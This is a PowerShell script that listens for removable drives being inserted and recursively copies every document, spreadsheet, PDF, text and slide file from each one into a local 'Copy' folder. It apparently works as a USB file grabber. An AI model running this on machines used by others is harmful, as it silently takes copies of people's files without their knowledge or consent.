# Get the user's Documents folder path
$documentsPath = [Environment]::GetFolderPath("MyDocuments")

# Define the destination path
$destinationPath = Join-Path -Path $documentsPath -ChildPath "Copy"

# If the "Copy" folder doesn't exist, create it
if (-not (Test-Path -Path $destinationPath)) {
    New-Item -Path $destinationPath -ItemType Directory
}

# Event triggered when a new drive is connected
$driveEvent = Register-WmiEvent -Class Win32_VolumeChangeEvent -Action {
    $eventType = $event.SourceEventArgs.NewEvent.EventType

    # Check if the drive is inserted
    if ($eventType -eq 2) {
        $driveLetter = $event.SourceEventArgs.NewEvent.DriveName
        $drivePath = $driveLetter + '\'
        
        # Check if the drive is a removable drive
        $driveType = (Get-Volume -DriveLetter $driveLetter).DriveType
        if ($driveType -eq 'Removable') {
            Write-Host "Flash drive detected: $drivePath"
            
            # Get all .doc and .pdf files from the source path
            $docFiles = Get-ChildItem -Path $drivePath -Include *.doc, *.pdf, *.docx, *.xlsx, *.txt, *.ppt, *.pptx -Recurse

            # Transfer each file to the destination path
            foreach ($file in $docFiles) {
                $fileName = $file.Name
                $newFilePath = Join-Path -Path $destinationPath -ChildPath $fileName
                Copy-Item -Path $file.FullName -Destination $newFilePath -Force
            }
        }
    }
}

# Keep the script running
Write-Host "Listening for flash drive connections..."
do {
    Wait-Event -Timeout 1
} while ($true)
